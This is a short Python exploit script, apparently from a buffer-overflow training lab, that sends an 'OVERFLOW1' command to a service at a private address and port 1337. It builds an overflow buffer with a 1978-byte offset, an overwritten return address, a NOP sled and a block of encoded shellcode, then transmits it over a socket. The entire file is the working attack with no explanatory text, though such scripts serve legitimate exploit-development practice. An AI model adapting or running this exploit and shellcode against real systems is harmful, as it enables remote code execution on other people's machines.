import socket

ip = "10.0.2.5"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
# 0x625011af 
padding = "\x90"*16
payload = ("\xbd\xbe\xdd\xe6\xe6\xdd\xc0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x6e\x12\x03\x6e\x12\x83\x50\x21\x04\x13\x50\x32\x4b"
"\xdc\xa8\xc3\x2c\x54\x4d\xf2\x6c\x02\x06\xa5\x5c\x40\x4a\x4a"
"\x16\x04\x7e\xd9\x5a\x81\x71\x6a\xd0\xf7\xbc\x6b\x49\xcb\xdf"
"\xef\x90\x18\x3f\xd1\x5a\x6d\x3e\x16\x86\x9c\x12\xcf\xcc\x33"
"\x82\x64\x98\x8f\x29\x36\x0c\x88\xce\x8f\x2f\xb9\x41\x9b\x69"
"\x19\x60\x48\x02\x10\x7a\x8d\x2f\xea\xf1\x65\xdb\xed\xd3\xb7"
"\x24\x41\x1a\x78\xd7\x9b\x5b\xbf\x08\xee\x95\xc3\xb5\xe9\x62"
"\xb9\x61\x7f\x70\x19\xe1\x27\x5c\x9b\x26\xb1\x17\x97\x83\xb5"
"\x7f\xb4\x12\x19\xf4\xc0\x9f\x9c\xda\x40\xdb\xba\xfe\x09\xbf"
"\xa3\xa7\xf7\x6e\xdb\xb7\x57\xce\x79\xbc\x7a\x1b\xf0\x9f\x12"
"\xe8\x39\x1f\xe3\x66\x49\x6c\xd1\x29\xe1\xfa\x59\xa1\x2f\xfd"
"\x9e\x98\x88\x91\x60\x23\xe9\xb8\xa6\x77\xb9\xd2\x0f\xf8\x52"
"\x22\xaf\x2d\xf4\x72\x1f\x9e\xb5\x22\xdf\x4e\x5e\x28\xd0\xb1"
"\x7e\x53\x3a\xda\x15\xae\xad\xef\xe9\xb2\x29\x98\xeb\xb2\x20"
"\x04\x65\x54\x28\xa4\x23\xcf\xc5\x5d\x6e\x9b\x74\xa1\xa4\xe6"
"\xb7\x29\x4b\x17\x79\xda\x26\x0b\xee\x2a\x7d\x71\xb9\x35\xab"
"\x1d\x25\xa7\x30\xdd\x20\xd4\xee\x8a\x65\x2a\xe7\x5e\x98\x15"
"\x51\x7c\x61\xc3\x9a\xc4\xbe\x30\x24\xc5\x33\x0c\x02\xd5\x8d"
"\x8d\x0e\x81\x41\xd8\xd8\x7f\x24\xb2\xaa\x29\xfe\x69\x65\xbd"
"\x87\x41\xb6\xbb\x87\x8f\x40\x23\x39\x66\x15\x5c\xf6\xee\x91"
"\x25\xea\x8e\x5e\xfc\xae\xaf\xbc\xd4\xda\x47\x19\xbd\x66\x0a"
"\x9a\x68\xa4\x33\x19\x98\x55\xc0\x01\xe9\x50\x8c\x85\x02\x29"
"\x9d\x63\x24\x9e\x9e\xa1")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


